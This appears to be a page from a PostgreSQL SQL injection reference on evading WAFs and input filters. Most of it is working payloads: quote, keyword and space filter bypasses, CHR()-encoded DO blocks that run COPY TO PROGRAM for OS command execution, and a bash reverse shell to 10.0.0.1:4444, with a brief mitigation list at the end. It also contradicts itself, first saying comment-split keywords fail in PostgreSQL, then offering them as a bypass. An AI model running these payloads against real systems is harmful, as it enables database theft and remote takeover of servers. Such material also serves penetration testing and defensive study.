---
title: Fuzzing and Obfuscation
description: Techniques for bypassing WAFs and filters in PostgreSQL injection
category: Advanced Techniques
order: 20
tags: ["bypass", "WAF", "obfuscation", "filter evasion"]
lastUpdated: 2025-12-14
---

## Fuzzing and Obfuscation

Modern web applications often employ Web Application Firewalls (WAFs) and other security measures to detect and block SQL injection attempts. Fuzzing and obfuscation techniques can help bypass these protections by disguising SQL injection payloads.

### Comment Variations

PostgreSQL supports multiple comment styles:

```sql
-- Standard SQL line comment (double dash)
SELECT * FROM users -- comment

-- C-style block comment
SELECT * FROM users /* comment */

-- Inline comments for obfuscation
SELECT/*comment*/username/**/FROM/**/users

-- Nested comments (PostgreSQL allows this)
SELECT /* outer /* nested */ comment */ username FROM users
```

### Dollar Quote Obfuscation

PostgreSQL's dollar quoting is powerful for bypassing quote filters:

```sql
-- Avoid single quotes entirely
SELECT * FROM users WHERE username = $$admin$$

-- Tagged dollar quotes
SELECT * FROM users WHERE username = $x$admin$x$

-- Different tags for nesting
SELECT $outer$String with $$inner$$ quotes$outer$

-- In injection context
' OR username = $$admin$$ --
```

### Whitespace Manipulation

PostgreSQL accepts various whitespace characters:

```sql
-- Using tabs and newlines
SELECT
    username
FROM
    users

-- Using form feed and vertical tab (may work in some contexts)
SELECT%0Ausername%0AFROM%0Ausers

-- Excessive whitespace
SELECT       username       FROM       users
```

### Case Variation

SQL keywords in PostgreSQL are case-insensitive:

```sql
select USERNAME from USERS where ID=1
SeLeCt UsErNaMe FrOm UsErS wHeRe Id=1
SELECT username FROM users WHERE id=1
```

### String Representation Alternatives

Multiple ways to represent strings:

```sql
-- Standard single quotes
SELECT 'admin'

-- Dollar quotes
SELECT $$admin$$

-- CHR() function (avoid quotes entirely)
SELECT CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)  -- 'admin'

-- Escape string syntax
SELECT E'\x61\x64\x6d\x69\x6e'  -- 'admin' in hex

-- Unicode escape
SELECT U&'\0061\0064\006D\0069\006E'  -- 'admin'

-- convert_from with bytea
SELECT convert_from('\x61646d696e', 'UTF8')  -- 'admin'
```

### Numeric Representation

Numbers can be represented various ways:

```sql
-- Standard
SELECT * FROM users WHERE id = 1

-- Mathematical expressions
SELECT * FROM users WHERE id = 2-1
SELECT * FROM users WHERE id = 0+1

-- Boolean conversion
SELECT * FROM users WHERE id = true::int  -- true = 1

-- Cast from string
SELECT * FROM users WHERE id = '1'::int

-- Hexadecimal in numeric context
SELECT * FROM users WHERE id = x'1'::int
```

### Type Casting for Bypass

PostgreSQL's `::` operator can help bypass filters:

```sql
-- Cast to avoid pattern matching
SELECT * FROM users WHERE id = '1'::integer

-- Array syntax
SELECT * FROM users WHERE id = ANY(ARRAY[1])

-- Using CAST function instead of ::
SELECT * FROM users WHERE id = CAST('1' AS int)
```

### Function Call Variations

```sql
-- Standard function call
SELECT SUBSTRING('admin', 1, 3)

-- Using FROM/FOR syntax
SELECT SUBSTRING('admin' FROM 1 FOR 3)

-- Alternative function names
SELECT SUBSTR('admin', 1, 3)
SELECT LEFT('admin', 3)
```

### UNION Query Obfuscation

```sql
-- Standard UNION
SELECT * FROM users UNION SELECT 1,2,3

-- UNION ALL (avoids DISTINCT processing)
SELECT * FROM users UNION ALL SELECT 1,2,3

-- Adding redundant conditions
SELECT * FROM users WHERE 1=1 UNION SELECT 1,2,3 WHERE 1=1

-- Nested queries
SELECT * FROM (SELECT * FROM users UNION SELECT 1,2,3) AS t
```

### Keyword Splitting with Comments (Limited in PostgreSQL)

**Important**: Unlike MySQL, PostgreSQL does **NOT** support splitting keywords with inline comments. The following MySQL techniques will **NOT** work in PostgreSQL:

```sql
-- DOES NOT WORK in PostgreSQL (works in MySQL)
SEL/**/ECT username FR/**/OM users  -- Syntax error!
UN/**/ION SEL/**/ECT 1,2,3          -- Syntax error!
VERS/**/ION()                        -- Syntax error!
```

However, comments **between** complete keywords still work:

```sql
-- Comments between keywords (works in PostgreSQL)
SELECT /**/ username /**/ FROM /**/ users WHERE id = 1
SELECT /* comment */ * FROM /* another */ users

-- Inline comments for spacing
SELECT/**/username/**/FROM/**/users WHERE id = 1
```

### Alternative SQL Constructs

```sql
-- Instead of UNION SELECT
SELECT username FROM users WHERE id=1 OR 1=1
SELECT * FROM users LIMIT 1 OFFSET 0

-- Instead of OR 1=1
OR true
OR NOT false
OR 1
OR ''=''

-- Instead of AND 1=1
AND true
AND NOT false
AND 1::boolean
```

### Encoding Techniques

```sql
-- URL encoding (handled by web server)
%27%20OR%20%271%27%3D%271

-- Double URL encoding
%2527%2520OR%2520%25271%2527%253D%25271

-- Unicode encoding in strings
U&'\0027 OR \00271\0027=\00271'
```

### Using Subqueries

```sql
-- Hide data extraction in subquery
SELECT * FROM users WHERE id = (SELECT 1)

-- Using WITH clause (CTE)
WITH t AS (SELECT 1 AS id) SELECT * FROM users, t WHERE users.id = t.id

-- Correlated subquery
SELECT * FROM users u WHERE EXISTS (SELECT 1 WHERE u.id = 1)
```

### PostgreSQL-Specific Bypasses

#### Array Operators

```sql
-- Using array contains
SELECT * FROM users WHERE ARRAY[id] @> ARRAY[1]

-- Using ANY
SELECT * FROM users WHERE id = ANY('{1,2,3}'::int[])

-- Using array comparison
SELECT * FROM users WHERE id = (ARRAY[1,2,3])[1]
```

#### Regular Expression Operators

```sql
-- Instead of LIKE
SELECT * FROM users WHERE username ~ '^admin'

-- Case insensitive
SELECT * FROM users WHERE username ~* 'ADMIN'

-- SIMILAR TO
SELECT * FROM users WHERE username SIMILAR TO 'a%'
```

#### JSON Operators (if applicable)

```sql
-- Using JSON functions to construct values
SELECT * FROM users WHERE username = ('{"name":"admin"}'::json->>'name')
```

### Practical Bypass Examples

#### Bypassing Quote Filters

```sql
-- If single quotes are blocked
' OR username = $$admin$$ --
' OR username = CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110) --
' OR username = (SELECT chr(97)||chr(100)||chr(109)||chr(105)||chr(110)) --
```

#### Bypassing Keyword Filters

```sql
-- If 'SELECT' is blocked
' UNION (TABLE users) --  -- PostgreSQL allows TABLE as shorthand

-- If 'UNION' is blocked (use stacked queries if supported)
'; SELECT * FROM users --

-- Break keywords with comments
' UN/**/ION SEL/**/ECT username, password FR/**/OM users --
```

#### Bypassing Space Filters

```sql
-- Use comments instead of spaces
'/**/OR/**/1=1--

-- Use parentheses
'OR(1=1)--

-- Use line comments
'OR--comment%0A1=1--
```

### DO $$ Block WAF Bypass

The `DO` command executes anonymous PL/pgSQL code blocks. Combined with `CHR()` encoding, this can bypass many WAF signatures that look for specific SQL keywords.

**Basic DO Block:**

```sql
-- Execute arbitrary PL/pgSQL
DO $$ BEGIN RAISE NOTICE 'Hello'; END $$;

-- With variable declaration
DO $$
DECLARE
    result TEXT;
BEGIN
    SELECT username INTO result FROM users LIMIT 1;
    RAISE NOTICE 'User: %', result;
END $$;
```

**Building Commands with CHR() to Bypass WAF:**

```sql
-- Build 'COPY' command character by character
DO $$
DECLARE
    cmd TEXT;
BEGIN
    -- CHR(67)='C', CHR(79)='O', CHR(80)='P', CHR(89)='Y'
    cmd := CHR(67) || CHR(79) || CHR(80) || CHR(89);
    cmd := cmd || ' (SELECT '''') TO PROGRAM ''id''';
    EXECUTE cmd;
END $$;

-- Full reverse shell bypass
DO $$
DECLARE
    cmd TEXT;
BEGIN
    cmd := CHR(67)||CHR(79)||CHR(80)||CHR(89);  -- COPY
    cmd := cmd || ' (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"''';
    EXECUTE cmd;
END $$;
```

**Encoded COPY TO PROGRAM:**

```sql
-- Bypass 'COPY' keyword filter
DO $x$
DECLARE
    c TEXT := CHR(67)||CHR(79)||CHR(80)||CHR(89);  -- COPY
    p TEXT := CHR(80)||CHR(82)||CHR(79)||CHR(71)||CHR(82)||CHR(65)||CHR(77);  -- PROGRAM
BEGIN
    EXECUTE c || ' (SELECT 1) TO ' || p || ' ''whoami''';
END $x$;
```

**Dynamic Table Creation:**

```sql
-- Build table name dynamically
DO $$
DECLARE
    tbl TEXT;
BEGIN
    tbl := CHR(99)||CHR(109)||CHR(100);  -- 'cmd'
    EXECUTE 'CREATE TABLE ' || tbl || ' (output TEXT)';
    EXECUTE 'COPY ' || tbl || ' FROM PROGRAM ''id''';
END $$;
```

**Using EXECUTE for Any Statement:**

```sql
-- Execute any SQL dynamically
DO $$
BEGIN
    -- SELECT bypass
    EXECUTE CHR(83)||CHR(69)||CHR(76)||CHR(69)||CHR(67)||CHR(84)||' * FROM users';

    -- DROP bypass (dangerous!)
    -- EXECUTE CHR(68)||CHR(82)||CHR(79)||CHR(80)||' TABLE logs';
END $$;
```

**Helper Function to Convert String to CHR:**

```sql
-- In your attack preparation (not during injection)
-- Convert any string to CHR() calls
SELECT string_agg('CHR(' || ascii(ch) || ')', '||')
FROM regexp_split_to_table('COPY', '') AS ch;
-- Returns: CHR(67)||CHR(79)||CHR(80)||CHR(89)
```

### Automated Testing

Test obfuscation with tools:

```bash
# SQLMap with tamper scripts
sqlmap -u "http://target/page?id=1" --tamper=space2comment,charencode

# Common PostgreSQL tamper scripts:
# - space2comment: Replace spaces with /**/
# - charencode: URL encode characters
# - between: Replace > with BETWEEN
# - randomcase: Randomize keyword case
```

### Mitigation

To protect against obfuscation techniques:

1. Use parameterized queries (prepared statements)
2. Implement input validation with whitelist approach
3. Use WAF with regularly updated signatures
4. Limit database user privileges
5. Monitor and log suspicious query patterns
6. Use security testing tools to validate protections
